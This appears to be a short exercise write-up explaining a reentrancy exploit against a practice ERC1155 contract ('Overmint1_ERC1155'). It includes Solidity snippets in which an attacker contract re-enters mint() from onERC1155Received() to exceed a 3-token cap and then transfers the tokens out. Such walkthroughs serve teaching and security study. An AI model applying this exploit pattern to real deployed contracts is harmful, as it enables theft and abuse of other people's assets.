In the updated exploit, the attacker contract (`Overmint1_ERC1155_Attacker`) takes advantage of the reentrancy vulnerability in the target contract (`Overmint1_ERC1155`):

1. Deploy both contracts, with the attacker contract receiving the target contract's address.
2. Call `attack()` in the attacker contract, which calls the `mint()` function in the target contract.
3. The target contract's `_mint()` function transfers a token to the attacker contract, triggering the `onERC1155Received()` function.

```solidity
while (target.success(address(this), TOKENID) == false) {
    console.log("are we done?:", target.success(address(this), TOKENID));
    target.mint(TOKENID, "");
}
```

4. The onERC1155Received() function repeatedly calls the target's mint() function until the attacker contract's balance for the token ID is 5.

5. The attack() function transfers the 5 tokens from the attacker contract to the user (msg.sender) using the target contract's safeTransferFrom() function.

```solidity
function attack() external {
    console.log("Attack Started");
    target.mint(TOKENID, "");

    console.log("Finished attack, now send tokens to attacker address - safeTransferFrom");
    target.safeTransferFrom(address(this), msg.sender, TOKENID, 5, "");
}
```

The exploit successfully bypasses the intended 3-token limit, and the attacker contract ends up with a balance of 5 tokens.
